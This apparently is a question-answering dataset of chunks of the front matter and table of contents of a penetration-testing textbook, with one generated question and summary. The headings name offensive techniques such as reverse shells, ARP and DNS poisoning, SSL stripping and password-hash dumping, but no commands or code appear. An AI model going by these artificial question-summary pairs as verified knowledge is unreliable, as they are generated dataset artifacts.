[
  {
    "start": 1,
    "end": 4,
    "text": "Penetration testing\nP e n e t r a t i o n\nt e s t i n g\na Hands-on introduction\nto Hacking\nby Georgia Weidman\nSan Francisco\nPenetration testing. Copyright © 2014 by Georgia Weidman.\nAll rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, electronic\nor mechanical, including photocopying, recording, or by any information storage or retrieval system, without the\nprior written permission of the copyright owner and the publisher.\nPrinted in USA\nFirst printing\n18 17 16 15 14 1 2 3 4 5 6 7 8 9\n\nISBN-10: 1-59327-564-1\n\nISBN-13: 978-1-59327-564-8\nPublisher: William Pollock\nProduction Editor: Alison Law\nCover Illustration: Mertsaloff/Shutterstock\nInterior Design: Octopod Studios\nDevelopmental Editor: William Pollock\nTechnical Reviewer: Jason Oliver\nCopyeditor: Pamela Hunt\nCompositor: Susan Glinert Stevens\nProofreader: James Fraleigh\nIndexer: Nancy Guenther\nFor information on distribution, translations, or bulk sales, please contact No Starch Press, Inc. directly:\nNo Starch Press, Inc.\n245 8th Street, San Francisco, CA 94103\nphone: 415.863.9900; fax: 415.863.9950; info@nostarch.com; www.nostarch.com\nLibrary of Congress Cataloging-in-Publication Data\nWeidman, Georgia.\nPenetration testing : a hands-on introduction to hacking / Georgia Weidman.\npages cm\nIncludes index.\nISBN 978-1-59327-564-8 (paperback) -- ISBN 1-59327-564-1 (paperback)\n1. Penetration testing (Computer security) 2. Kali Linux. 3. Computer hackers. I. Title.\n\nQA76.9.A25W4258 2014\n\n005.8'092--dc23\n2014001066\nNo Starch Press and the No Starch Press logo are registered trademarks of No Starch Press, Inc. Other product and\ncompany names mentioned herein may be the trademarks of their respective owners. Rather than use a trademark\nsymbol with every occurrence of a trademarked name, we are using the names only in an editorial fashion and to\nthe benefit of the trademark owner, with no intention of infringement of the trademark. The information in this book is distributed on an “As Is” basis, without warranty. While every precaution has been\ntaken in the preparation of this work, neither the author nor No Starch Press, Inc. shall have any liability to any\nperson or entity with respect to any loss or damage caused or alleged to be caused directly or indirectly by the infor-\nmation contained in it. In memory of Jess Hilden\nAbout the Author\nGeorgia Weidman is a penetration tester and\nresearcher, as well as the founder of Bulb\nSecurity, a security consulting firm. She pre­\nsents at conferences around the world includ­\ning Black Hat, ShmooCon, and DerbyCon, and\nteaches classes on topics such as penetration\ntesting, mobile hacking, and exploit develop­\nment. Her work in mobile security has been\nfeatured in print and on television internation­\nally. She was awarded a DARPA Cyber Fast\nTrack grant to continue her work in mobile\ndevice security. © Tommy Phillips Photography\nBrief Contents\nForeword by Peter Van Eeckhoutte . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xix\nAcknowledgments  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiii\nIntroduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxv\nChapter 0: Penetration Testing Primer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .1\nPart I: the BasIcs\nChapter 1: Setting Up Your Virtual Lab . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .9\nChapter 2: Using Kali Linux . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .55\nChapter 3: Programming  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .75\nChapter 4: Using the Metasploit Framework  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .87\nPart II: assessments\nChapter 5: Information Gathering  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .113\nChapter 6: Finding Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .133\nChapter 7: Capturing Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .155\nPart III: attacks\nChapter 8: Exploitation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .179\nChapter 9: Password Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .197\nChapter10: Client-Side Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .215\nChapter 11: Social Engineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .243\nChapter 12: Bypassing Antivirus Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .257\nChapter 13: Post Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .277\nChapter 14: Web Application Testing  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .313\nChapter 15: Wireless Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .339\nPart IV: exPloIt DeVeloPment\nChapter 16: A Stack-Based Buffer Overflow in Linux  . . . . . . . . . . . . . . . . . . . . . . . . . . .361\nChapter 17: A Stack-Based Buffer Overflow in Windows  . . . . . . . . . . . . . . . . . . . . . . . .379\nChapter 18: Structured Exception Handler Overwrites  . . . . . . . . . . . . . . . . . . . . . . . . . .401\nChapter 19: Fuzzing, Porting Exploits, and Metasploit Modules . . . . . . . . . . . . . . . . . . . .421\nPart V: moBIle hackInG\nChapter 20: Using the Smartphone Pentest Framework  . . . . . . . . . . . . . . . . . . . . . . . . .445\nResources  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .473\nIndex  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .477\nviii Brief Contents\nContents in De tail\nForeword by Peter Van eeckhoutte xix\naCknowLedgments xxiii\nintroduCtion xxv\nA Note of Thanks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxvi\nAbout This Book . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxvi\nPart I: The Basics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxvii\nPart II: Assessments  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxvii\nPart III: Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxvii\nPart IV: Exploit Development . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxviii\nPart V: Mobile Hacking  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxviii\n0\nPenetration testing Primer 1\nThe Stages of the Penetration Test  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\nPre-engagement  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\nInformation Gathering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nThreat Modeling . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nVulnerability Analysis  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nExploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nPost Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nReporting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\nPart i\nthe BasiCs\n1\nsetting uP Your VirtuaL LaB 9\nInstalling VMware  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\nSetting Up Kali Linux  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\nConfiguring the Network for Your Virtual Machine  . . . . . . . . . . . . . . . . . . . . 13\nInstalling Nessus . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\nInstalling Additional Software . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\nSetting Up Android Emulators  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22\nSmartphone Pentest Framework . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\nTarget Virtual Machines  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n\n. . . . . . . . . . 28\nCreating the Windows XP Target . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\nVMware Player on Microsoft Windows  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\nVMware Fusion on Mac OS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\nInstalling and Activating Windows  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\nInstalling VMware Tools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35\nTurning Off Windows Firewall  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\nSetting User Passwords  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\nSetting a Static IP Address  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\nMaking XP Act Like It’s a Member of a Windows Domain  . . . . . . . . . . . . . . . 39\nInstalling Vulnerable Software . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40\nInstalling Immunity Debugger and Mona  . . . . . . . . . . . . . . . . . . . . . . . . . . . 46\nSetting Up the Ubuntu 8 .10 Target . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48\nCreating the Windows 7 Target . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48\nCreating a User Account  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48\nOpting Out of Automatic Updates . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50\nSetting a Static IP Address  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51\nAdding a Second Network Interface  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52\nInstalling Additional Software . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54\n2\nusing kaLi Linux 55\nLinux Command Line  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nThe Linux Filesystem  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nChanging Directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nLearning About Commands: The Man Pages . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 57\nUser Privileges . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58\nAdding a User  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58\nAdding a User to the sudoers File  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59\nSwitching Users and Using sudo . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59\nCreating a New File or Directory  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60\nCopying, Moving, and Removing Files  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60\nAdding Text to a File . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61\nAppending Text to a File  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61\nFile Permissions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61\nEditing Files . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 62\nSearching for Text . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63\nEditing a File with vi  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63\nData Manipulation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64\nUsing grep . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65\nUsing sed . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65\nPattern Matching with awk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 66\nManaging Installed Packages  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 66\nProcesses and Services . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67\nManaging Networking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67\nSetting a Static IP Address  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 68\nViewing Network Connections  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69\nNetcat: The Swiss Army Knife of TCP/IP Connections . . . . . . . . . . . . . . . . . . . . . . . . . 69\nCheck to See If a Port Is Listening  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70\nOpening a Command Shell Listener . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70\nPushing a Command Shell Back to a Listener  . . . . . . . . . . . . . . . . . . . . . . . . 71\nAutomating Tasks with cron Jobs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 73\nx Contents in Detail\n3\nProgramming 75\nBash Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 75\nPing  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76\nA Simple Bash Script . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76\nRunning Our Script  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77\nAdding Functionality with if Statements  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77\nA for Loop  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 78\nStreamlining the Results  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79\nPython Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 81\nConnecting to a Port  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83\nif Statements in Python . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83\nWriting and Compiling C Programs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84\nSummary  . . . . . . . . . . . . . . . . .\n\n. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85\n4\nusing the metasPLoit Framework 87\nStarting Metasploit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88\nFinding Metasploit Modules . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90\nThe Module Database . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90\nBuilt-In Search . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 91\nSetting Module Options  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 94\n\nRHOST  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 94\n\nRPORT . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95",
    "question": "What is the main purpose and focus of the book \"Penetration Testing: A Hands-On Introduction to Hacking\"?",
    "summary": "\"Penetration Testing: A Hands-On Introduction to Hacking\" by Georgia Weidman is a guide to learning how to identify and exploit security vulnerabilities in computer systems. The book covers the fundamentals of penetration testing, including setup of a virtual lab, use of Kali Linux, and the Metasploit Framework. It also includes chapters on various hacking techniques, such as vulnerability analysis, social engineering, and mobile device hacking, providing practical examples and step-by-step instructions for readers to gain hands-on experience in ethical hacking."
  },
  {
    "start": 5,
    "end": 10,
    "text": "SMBPIPE  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95\nExploit Target . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95\nPayloads (or Shellcode)  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 96\nFinding Compatible Payloads . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 96\nA Test Run  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 97\nTypes of Shells . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98\nBind Shells . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98\nReverse Shells . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98\nSetting a Payload Manually . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 99\nMsfcli . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101\nGetting Help . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101\nShowing Options  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101\nPayloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 102\nCreating Standalone Payloads with Msfvenom . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 103\nChoosing a Payload  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\nSetting Options . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\nChoosing an Output Format . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\nServing Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\nUsing the Multi/Handler Module . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\nUsing an Auxiliary Module  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 107\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 109\nContents in Detail xi\nPart ii\nassessments\n5\ninFormation gathering 113\nOpen Source Intelligence Gathering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114\nNetcraft . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114\nWhois Lookups . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115\nDNS Reconnaissance  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116\nSearching for Email Addresses  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 118\nMaltego . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 119\nPort Scanning  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 123\nManual Port Scanning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 124\nPort Scanning with Nmap  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 125\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 132\n6\nFinding VuLneraBiLities 133\nFrom Nmap Version Scan to Potential Vulnerability  . . . . . . . . . . . . . . . . . . . . . . . . . 133\nNessus  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 134\nNessus Policies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 134\nScanning with Nessus  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 138\nA Note About Nessus Rankings  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140\nWhy Use Vulnerability Scanners? . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 141\nExporting Nessus Results  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 141\nResearching Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 142\nThe Nmap Scripting Engine . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 142\nRunning a Single NSE Script  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\nMetasploit Scanner Modules  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 146\nMetasploit Exploit Check Functions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 147\nWeb Application Scanning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 148\nNikto . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149\nAttacking XAMPP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149\nDefault Credentials  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 150\nManual Analysis  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\nExploring a Strange Port  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\nFinding Valid Usernames . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 153\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 153\n7\nCaPturing traFFiC 155\nNetworking for Capturing Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156\nUsing Wireshark  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156\nCapturing Traffic  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156\nFiltering Traffic  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 158\nFollowing a TCP Stream . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159\nDissecting Packets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n\n160\nxii Contents in Detail\nARP Cache Poisoning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 160\nARP Basics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 161\nIP Forwarding . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 163\nARP Cache Poisoning with Arpspoof . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 164\nUsing ARP Cache Poisoning to Impersonate the Default Gateway  . . . . . . . . . 165\nDNS Cache Poisoning  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 167\nGetting Started . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 168\nUsing Dnsspoof . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 169\nSSL Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\nSSL Basics  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\nUsing Ettercap for SSL Man-in-the-Middle Attacks  . . . . . . . . . . . . . . . . . . . . 171\nSSL Stripping . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 173\nUsing SSLstrip . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 174\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 175\nPart III\nattacks\n8\nExPloItatIon 179\nRevisiting MS08-067  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180\nMetasploit Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180\nMeterpreter  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 181\nExploiting WebDAV Default Credentials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 182\nRunning a Script on the Target Web Server  . . . . . . . . . . . . . . . . . . . . . . . . 183\nUploading a Msfvenom Payload . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 183\nExploiting Open phpMyAdmin  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 186\nDownloading a File with TFTP . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 187\nDownloading Sensitive Files  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188\nDownloading a Configuration File . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188\nDownloading the Windows SAM  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189\nExploiting a Buffer Overflow in Third-Party Software . . . . . . . . . . . . . . . . . . . . . . . . . 190\nExploiting Third-Party Web Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 191\nExploiting a Compromised Service . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 193\nExploiting Open NFS Shares . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 194\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 196\n9\nPassword attacks 197\nPassword Management . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 197\nOnline Password Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 198\nWordlists . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 199\nGuessing Usernames and Passwords with Hydra  . . . . . . . . . . . . . . . . . . . . 202\nOffline Password Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203\nRecovering Password Hashes from a Windows SAM File . . . . . . . . . . . . . . . 204\nDumping Password Hashes with Physical Access . . . . . . . . . . . . . . . . . . . . . 206\nLM vs . NTLM Hashing Algorithms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 208\nThe Trouble with LM Password Hashes . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nContents in Detail xiii\nJohn the Ripper . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nCracking Linux Passwords  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nCracking Configuration File Passwords  . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nRainbow Tables  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nOnline Password-Cracking Services . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nDumping Plaintext Passwords from Memory with Windows Credential Editor  . . . . . . . 213\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 214\n10\nCLient-side exPLoitation 215\nBypassing Filters with Metasploit Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nAll Ports . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nHTTP and HTTPS Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nClient-Side Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 218\nBrowser Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 219\nPDF Exploits . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 225\nJava Exploits . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 230\nbrowser_autopwn . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 235\nWinamp  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 237\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 240\n11\nsoCiaL engineering 243\nThe Social-Engineer Toolkit  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 244\nSpear-Phishing Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 245\nChoosing a Payload  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 246\nSetting Options . . . . . . . . . . . . . . . . . . . . . . .\n\n. . . . . . . . . . . . . . . . . . . . . 247\nNaming Your File  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 